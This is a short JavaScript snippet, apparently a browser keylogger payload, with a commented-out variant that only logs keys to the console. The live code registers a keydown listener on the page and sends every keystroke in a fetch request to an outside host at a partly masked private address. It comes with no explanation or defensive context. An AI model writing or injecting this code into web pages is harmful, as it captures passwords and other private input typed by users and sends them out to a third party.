//////////////
//////////////

function logKey(event){ 
  
  fetch("http://192.168.xx.xx/yoyo?key=" + event.key);
}
 
document.addEventListener('keydown', logKey);

//////////////
//////////////
//
//  function logKey(event){
// 	  console.log(event.key)
//  }
//
//  document.addEventListener('keydown', logKey);
//
//////////////
//////////////
